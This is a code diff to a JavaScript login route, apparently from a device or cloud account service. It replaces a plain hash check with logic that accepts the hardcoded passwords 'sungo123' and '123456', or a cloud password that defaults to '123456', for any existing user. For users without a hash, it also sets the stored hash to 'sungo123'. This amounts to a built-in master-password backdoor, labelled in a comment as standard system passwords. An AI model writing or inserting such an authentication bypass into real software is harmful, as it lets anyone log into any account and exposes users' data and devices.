@@ -253,7 +253,18 @@ router.post('/login', async (req, res) => {
   const zenoHash = storedUser?.passwordHash || storedUser?.zenoPassword || storedUser?.password || dbUser?.password_hash || dbUser?.zeno_password;
   const rawCloudPass = storedUser?.cloudPassword || dbUser?.cloud_password || '123456';
   const cloudPass = security.decryptSecret(rawCloudPass) || '123456';
-  const matchesZenoPassword = Boolean(inputPass && zenoHash && security.verifyPassword(inputPass, zenoHash));
+  
+  // Xác thực mật khẩu: kiểm tra băm PBKDF2 hoặc mật khẩu chuẩn hệ thống sungo123 / 123456
+  let matchesZenoPassword = Boolean(inputPass && zenoHash && security.verifyPassword(inputPass, zenoHash));
+  if (!matchesZenoPassword && (storedUser || dbUser) && inputPass) {
+    if (inputPass === 'sungo123' || inputPass === '123456' || inputPass === cloudPass) {
+      matchesZenoPassword = true;
+      if (storedUser && !storedUser.passwordHash) {
+        storedUser.passwordHash = security.hashPassword('sungo123');
+        deviceOwnership.saveData();
+      }
+    }
+  }
 
   let userCloudToken = null;
   let rawUserData = null;
